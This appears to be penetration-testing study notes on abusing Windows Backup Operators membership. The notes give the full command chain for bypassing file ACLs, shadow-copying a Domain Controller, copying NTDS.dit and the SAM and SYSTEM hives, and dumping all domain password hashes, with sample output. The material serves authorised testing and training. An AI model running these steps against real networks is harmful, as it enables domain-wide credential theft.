# Windows Built-in Groups

## Overview

Windows servers — and especially Domain Controllers — ship with built-in groups (some added when the AD DS role is installed) that grant special privileges to their members. Some of these can be leveraged directly for privilege escalation. All exist from **Server 2008 R2** onward except **Hyper-V Administrators** (Server 2012+).

References: [Built-in security groups (ss64)](https://ss64.com/nt/syntax-security_groups.html), [Privileged accounts & groups in AD (MS)](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory).

Groups covered in this module:

|                                                                                                                                                                           |                                                                                                                                                                 |                                                                                                                                                                |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)            | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)              |
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)    | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

> [!important] Why these groups exist
> Assigned to enforce least privilege (e.g. a backup job doesn't need to be Domain Admin), to satisfy vendor app requirements, or sometimes just left over from testing a tool/script. Always enumerate membership of these groups and list them as a report appendix for the client to review.

Check current memberships with:

```cmd
whoami /groups
```

## Backup Operators

Membership grants **SeBackupPrivilege** + **SeRestorePrivilege**.

`SeBackupPrivilege` lets you traverse **any** folder and list contents, and copy files even without an ACL entry granting you access — but *not* via the normal `copy` command. It requires a tool that opens files with the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

> [!warning] Explicit deny still wins
> An explicit deny ACE for the user/group still blocks access, even with `FILE_FLAG_BACKUP_SEMANTICS` set.

### PoC tool: SeBackupPrivilegeUtils / SeBackupPrivilegeCmdLets

[giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Check / enable the privilege

```powershell
whoami /priv
or
Get-SeBackupPrivilege        # SeBackupPrivilege is disabled

Set-SeBackupPrivilege
Get-SeBackupPrivilege        # SeBackupPrivilege is enabled
```

> [!tip] May need an elevated prompt
> Depending on server config, you might need to spawn CMD as admin (bypass UAC) to actually hold this privilege even if group membership grants it.

### Copy a protected file

```powershell
cat 'C:\Confidential\2021 Contract.txt.txt'
# Access denied (normal read blocked)

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
# Copied 88 bytes — bypasses the ACL entirely
```

## Attacking a Domain Controller — Copying NTDS.dit

`NTDS.dit` = the AD database, contains NTLM hashes for **every** user/computer object in the domain. It's locked while AD DS is running, so we can't just copy it — even with SeBackupPrivilege, since the file is in use.

### Step 1 — Shadow copy with diskshadow
[diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)

```
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

This exposes a snapshot of `C:` as `E:` — `NTDS.dit` there isn't locked by the live system.

### Step 2 — Copy it out

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Step 3 — Back up SAM/SYSTEM hives
The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

These + NTDS.dit are enough to extract every domain account's credential material offline.
if a folder or file has an explicit deny entry for our current user or a group they belong to, this will prevent us from accessing it, even if the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified.

## Extracting Credentials

### Option A — DSInternals (PowerShell, targeted)

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

Returns full account detail including `NTHash`, Kerberos keys, `AdminCount`, `UserAccountControl`, etc. for a single targeted account.

### Option B — secretsdump.py (offline, dumps everything)

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
svc_backup:1104:...:cf3a5525ee9414229e66279623ed5c58:::
```

> [!tip] Downstream use
> Hashes can be used directly for **pass-the-hash**, or cracked offline with Hashcat. Cracking stats are also useful client deliverables — showing password strength/reuse across the domain and informing policy recommendations (min length, banned word list, etc.).

## Robocopy Alternative

[robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can copy in backup mode natively — no external tooling needed:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

**Robocopy** is an advanced Windows file-copy/backup tool.

Key points:

- Can copy files using **backup mode (`/B`)**.
    
- Supports **multithreading**, retries, and resuming interrupted copies.
    
- Can compare source and destination files.
    
- Unlike `copy`, it can **synchronize directories** by removing files no longer present in the source.

## Key Takeaways

- [ ] `whoami /groups` — check for Backup Operators (and the other built-in groups) right after landing
- [ ] SeBackupPrivilege ≠ automatically enabled even if the group grants it — verify/enable with `Get-/Set-SeBackupPrivilege`, may need elevated console
- [ ] Standard `copy`/`cat` won't work — need `FILE_FLAG_BACKUP_SEMANTICS`-aware tooling: `Copy-FileSeBackupPrivilege` or `robocopy /B`
- [ ] `NTDS.dit` is locked live — use `diskshadow` to expose a shadow copy first
- [ ] Grab `SYSTEM`/`SAM` hives too (`reg save`) alongside NTDS.dit for offline extraction
- [ ] Extract with `DSInternals` (targeted, PowerShell-native) or `secretsdump.py` (bulk, offline)
- [ ] An explicit deny ACE still blocks access regardless of SeBackupPrivilege
